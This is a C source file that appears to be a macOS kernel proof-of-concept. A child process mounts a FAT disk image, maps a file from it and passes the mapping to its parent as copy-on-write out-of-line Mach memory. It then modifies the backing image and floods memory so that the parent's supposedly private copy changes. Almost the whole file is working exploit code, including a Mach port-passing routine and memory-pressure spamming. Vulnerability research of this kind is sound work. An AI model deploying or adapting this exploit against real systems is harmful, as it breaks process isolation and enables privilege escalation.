#define RAM_GB 16ULL
#define SIZE ((RAM_GB+4ULL) * 1024ULL * 1024ULL * 1024ULL)

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>

#include <sys/mman.h>
#include <sys/stat.h>

#include <libkern/OSAtomic.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_vm.h>
#include <mach/task.h>
#include <mach/task_special_ports.h>

#define MACH_ERR(str, err) do { \
  if (err != KERN_SUCCESS) {    \
    mach_error("[-]" str "\n", err); \
    exit(EXIT_FAILURE);         \
  }                             \
} while(0)

#define FAIL(str) do { \
  printf("[-] " str "\n");  \
  exit(EXIT_FAILURE);  \
} while (0)

#define LOG(str) do { \
  printf("[+] " str"\n"); \
} while (0)

/***************
 * port dancer *
 ***************/

// set up a shared mach port pair from a child process back to its parent without using launchd
// based on the idea outlined by Robert Sesek here: https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html

// mach message for sending a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
} port_msg_send_t;

// mach message for receiving a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
  mach_msg_trailer_t trailer;
} port_msg_rcv_t;

typedef struct {
  mach_msg_header_t  header;
} simple_msg_send_t;

typedef struct {
  mach_msg_header_t  header;
  mach_msg_trailer_t trailer;
} simple_msg_rcv_t;

#define STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT

// a copy in the parent of the stolen special port such that it can be restored
mach_port_t saved_special_port = MACH_PORT_NULL;

// the shared port right in the parent
mach_port_t shared_port_parent = MACH_PORT_NULL;

void setup_shared_port() {
  kern_return_t err;
  // get a send right to the port we're going to overwrite so that we can both
  // restore it for ourselves and send it to our child
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &saved_special_port);
  MACH_ERR("saving original special port value", err);

  // allocate the shared port we want our child to have a send right to
  err = mach_port_allocate(mach_task_self(),
                           MACH_PORT_RIGHT_RECEIVE,
                           &shared_port_parent);

  MACH_ERR("allocating shared port", err);

  // insert the send right
  err = mach_port_insert_right(mach_task_self(),
                               shared_port_parent,
                               shared_port_parent,
                               MACH_MSG_TYPE_MAKE_SEND);
  MACH_ERR("inserting MAKE_SEND into shared port", err);

  // stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);
  MACH_ERR("setting special port", err);
}

mach_port_t recover_shared_port_child() {
  kern_return_t err;

  // grab the shared port which our parent stashed somewhere in the special ports
  mach_port_t shared_port_child = MACH_PORT_NULL;
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &shared_port_child);
  MACH_ERR("child getting stashed port", err);

  LOG("child got stashed port");

  // say hello to our parent and send a reply port so it can send us back the special port to restore

  // allocate a reply port
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err);

  // send the reply port in a hello message
  simple_msg_send_t msg = {0};

  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = shared_port_child;

  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);

  err = mach_msg_send(&msg.header);
  MACH_ERR("child sending task port message", err);

  LOG("child sent hello message to parent over shared port");

  // wait for a message on the reply port containing the stolen port to restore
  port_msg_rcv_t stolen_port_msg = {0};
  err = mach_msg(&stolen_port_msg.header, MACH_RCV_MSG, 0, sizeof(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
  MACH_ERR("child receiving stolen port\n", err);

  // extract the port right from the message
  mach_port_t stolen_port_to_restore = stolen_port_msg.port.name;
  if (stolen_port_to_restore == MACH_PORT_NULL) {
    FAIL("child received invalid stolen port to restore");
  }

  // restore the special port for the child
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);
  MACH_ERR("child restoring special port", err);

  LOG("child restored stolen port");
  return shared_port_child;
}

mach_port_t recover_shared_port_parent() {
  kern_return_t err;

  // restore the special port for ourselves
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);
  MACH_ERR("parent restoring special port", err);

  // wait for a message from the child on the shared port
  simple_msg_rcv_t msg = {0};
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port_parent,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child hello message", err);

  LOG("parent received hello message from child");

  // send the special port to our child over the hello message's reply port
  port_msg_send_t special_port_msg = {0};

  special_port_msg.header.msgh_size        = sizeof(special_port_msg);
  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;
  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;
  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), 0) | MACH_MSGH_BITS_COMPLEX;
  special_port_msg.body.msgh_descriptor_count = 1;

  special_port_msg.port.name        = saved_special_port;
  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg_send(&special_port_msg.header);
  MACH_ERR("parent sending special port back to child", err);

  return shared_port_parent;
}

/*** end of port dancer code ***/


struct ool_send_msg {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_descriptor_t desc;
};

struct ool_rcv_msg {
  mach_msg_header_t hdr;
  mach_msg_body_t body;
  mach_msg_ool_descriptor_t desc;
  mach_msg_trailer_t trailer;
};

struct ping_send_msg {
  mach_msg_header_t hdr;
};

struct ping_rcv_msg {
  mach_msg_header_t hdr;
  mach_msg_trailer_t trailer;
};

void do_child(mach_port_t shared_port) {
  kern_return_t err;

  // create a reply port to receive an ack that we should create memory pressure
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err);

	// mount the image file:
  system("open fatimg.img");

  sleep(10);

  LOG("mounted fatimg");

  // mmap a file from there:
  int fd = open("/Volumes/NO NAME/testfile", O_RDWR);
  if (fd == -1) {
    FAIL("open file on mounted image"); 
  }

  void* mapping = mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
  if (mapping == MAP_FAILED) {
    FAIL("mmap file from mounted image\n");
  }

  struct ool_send_msg msg = {0};

  msg.hdr.msgh_size = sizeof(msg);
  msg.hdr.msgh_local_port = reply_port;
  msg.hdr.msgh_remote_port = shared_port;
  msg.hdr.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND) | MACH_MSGH_BITS_COMPLEX;

  msg.body.msgh_descriptor_count = 1;

  msg.desc.type = MACH_MSG_OOL_DESCRIPTOR;
  msg.desc.copy = MACH_MSG_VIRTUAL_COPY;
  msg.desc.deallocate = 0;
  msg.desc.address = mapping;
  msg.desc.size = 0x4000;

  err = mach_msg_send(&msg.hdr);
  MACH_ERR("child sending OOL message", err);

  LOG("child sent message to parent");

  // wait for an ack to create memory pressure:
  struct ping_rcv_msg ping_rcv = {0};
  ping_rcv.hdr.msgh_size = sizeof(ping_rcv);
  ping_rcv.hdr.msgh_local_port = reply_port;
  err = mach_msg_receive(&ping_rcv.hdr);
  MACH_ERR("child receiving ping to create memory pressure", err);

  LOG("child received ping to start trying to change the OOL memory!");

  // write to the file underlying the mount:
  int img_fd = open("fatimg.img", O_RDWR);
  if (img_fd == -1) {
    FAIL("open fatimg for modification");
  }
  if (pwrite(img_fd, "AAAA", 4, 0x37000) != 4) {
    FAIL("pwrite of fatimg\n");
  }

	LOG("child wrote to the file underlying the mount\n");	
	

  // create memory pressure:
	int spam_fd = open("spamfile", O_RDWR|O_TRUNC|O_CREAT, 0666);
  if (spam_fd == -1) {
    FAIL("open spamfd");
  }

  if (ftruncate(spam_fd, SIZE)) {
    FAIL("ftruncate spamfd");
  }

  char *spam_mapping = mmap(NULL, SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, spam_fd, 0);

  if (spam_mapping == MAP_FAILED) {
    FAIL("mmap spamfd");
  }

  if (madvise(spam_mapping, SIZE, MADV_RANDOM)) {
    FAIL("madvise spam mapping");
  }
  
  LOG("child is spamming");

  for (unsigned long off = 0; off < SIZE; off++) {
    spam_mapping[off] = 42;
  }

  LOG("child has finished spamming");

  // send a message to read again:
  struct ping_send_msg ping = {0};
  ping.hdr.msgh_size = sizeof(ping);
  ping.hdr.msgh_remote_port = shared_port;
  ping.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);

  err = mach_msg_send(&ping.hdr);
  MACH_ERR("parent sending ping to child", err);
  
  // spin and let our parent kill us
  while(1){;}
}

void do_parent(mach_port_t shared_port) {
  kern_return_t err;

  // wait for our child to send us an OOL message
  struct ool_rcv_msg msg = {0};
  msg.hdr.msgh_local_port = shared_port;
  msg.hdr.msgh_size = sizeof(msg);
  err = mach_msg_receive(&msg.hdr);
  MACH_ERR("parent receiving child OOL message", err);

  volatile uint32_t* parent_cow_mapping = msg.desc.address;
  uint32_t parent_cow_size = msg.desc.size;

  printf("[+] parent got an OOL descriptor for %x bytes, mapped COW at: %p\n", parent_cow_size, (void*) parent_cow_mapping);

  printf("[+] parent reads: %08x\n", *parent_cow_mapping);

  LOG("telling child to try to change what I see!");

  mach_port_t parent_to_child_port = msg.hdr.msgh_remote_port;

  struct ping_send_msg ping = {0};
  ping.hdr.msgh_size = sizeof(ping);
  ping.hdr.msgh_remote_port = parent_to_child_port;
  ping.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);

  err = mach_msg_send(&ping.hdr);
  MACH_ERR("parent sending ping to child", err);

  // wait until we should try to read again:
  struct ping_rcv_msg ping_rcv = {0};
  ping_rcv.hdr.msgh_size = sizeof(ping_rcv);
  ping_rcv.hdr.msgh_local_port = shared_port;
  err = mach_msg_receive(&ping_rcv.hdr);
  MACH_ERR("parent receiving ping to try another read", err);

  LOG("parent got ping message from child, lets try to read again...");
  
  printf("[+] parent reads: %08x\n", *parent_cow_mapping);
}

int main(int argc, char** argv) {
  setup_shared_port();

  pid_t child_pid = fork();
  if (child_pid == -1) {
    FAIL("forking");
  }

  if (child_pid == 0) {
    mach_port_t shared_port_child = recover_shared_port_child();
    do_child(shared_port_child);
  } else {
    mach_port_t shared_port_parent = recover_shared_port_parent();
    do_parent(shared_port_parent);
  }

  kill(child_pid, 9);
  int status;
  wait(&status); 

  return 0;
}
